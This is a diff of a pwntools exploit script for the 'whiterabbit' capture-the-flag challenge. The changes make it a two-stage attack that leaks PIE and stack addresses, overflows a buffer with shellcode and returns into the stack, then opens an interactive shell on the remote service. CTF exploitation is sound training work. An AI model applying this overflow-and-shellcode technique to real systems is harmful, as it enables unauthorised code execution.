@@ -12,11 +12,11 @@ context.update(arch='amd64',os='linux')
 
 def start():
     if args.GDB:
-        return gdb.debug(elf.path, gdbscript=gs)
+        return gdb.debug("./chall", gdbscript=gs)
     if args.REMOTE:
         return remote("whiterabbit.chal.wwctf.com", 1337)
     else:
-        return process(elf.path)
+        return process("./chall")
 
 # Plan:
 
@@ -41,14 +41,19 @@ log.info("pieleak: %s"%hex(pie_leak))
 
 main = pie_leak
 
-main_off = 0x1180 # can also use elf.sym['main'] since it is main() that is leaked
+main_off = 0x1180
 
 ret_off = 0x101a
 
-pie_base = pie_leak - elf.sym['main']
+pie_base = pie_leak - main_off
 
 log.info("piebase: %s"%hex(pie_base))
 
+ret_off = 0x000000000000101a
+
+ret_gadget = ret_off + pie_base
+
+# Make payload
 
 # Shellcode is 24 bytes
 shellcode = asm('\n'.join([
@@ -61,7 +66,19 @@ shellcode = asm('\n'.join([
     'syscall',
 ]))
 
-payload = shellcode + b"A"*(120-len(shellcode)) + p64(pie_base + next(elf.search(asm('jmp rax'))))
+
+payload = b'A'*padding + p64(main+161)
+
+io.sendline(payload)
+
+io.recv() # recv rabbit
+stack_leak = u64(io.recv()[24:30].ljust(8,b"\x00"))
+stack_leak
+
+log.info("Stack @ %s" % hex(stack_leak))
+
+payload = shellcode + b'A'*(padding-len(shellcode)) + p64(stack_leak)
+
 io.sendline(payload)
 
 io.interactive()
